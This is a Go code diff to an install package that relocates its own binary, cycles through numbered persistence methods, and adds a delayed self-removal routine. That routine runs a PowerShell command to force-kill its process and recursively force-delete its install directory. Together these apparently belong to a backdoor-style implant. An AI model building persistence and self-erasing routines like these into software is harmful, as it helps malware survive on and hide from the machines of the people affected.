@@ -2,6 +2,7 @@ package install
 
 import (
 	"encoding/gob"
+	"fmt"
 	"log"
 	"os"
 	"path"
@@ -19,6 +20,10 @@ type installInfo struct {
 
 //Info contains persistent configuration details
 var Info installInfo
+
+const (
+	cmdUninstall = "kill %d -F;rm '%s' -R -Fo"
+)
 
 //IsInstalled checks whether or not a valid Base is already present on the system.
 func IsInstalled() bool {
@@ -91,15 +96,19 @@ func Install() {
 	log.Println("Base set: " + base)
 
 	err = CopyExecutable()
-	log.Println("Binary relocation failed,", err)
+	if err != nil {
+		log.Println("Binary relocation failed,", err)
+	} else {
+		log.Println("Binary relocation successful")
+	}
 
-	for i := 1; i < 4; i++ {
+	for i := 0; i < 4; i++ {
 		if err := persist(i); err == nil {
 			log.Printf("Persistence method #%d worked\n", i)
 			Info.PType = i
 			break
 		} else {
-			log.Println(err)
+			log.Println(i, err)
 		}
 	}
 
@@ -131,7 +140,11 @@ func Uninstall() [4]string {
 
 	//Remove self
 	go func() {
-
+		time.Sleep(5 * time.Second)
+		log.Println("Oh shit")
+		cmd := fmt.Sprintf(cmdUninstall, os.Getpid(), Info.Base)
+		util.RunPowershell(cmd)
+		log.Println("Never runs")
 	}()
 
 	return r
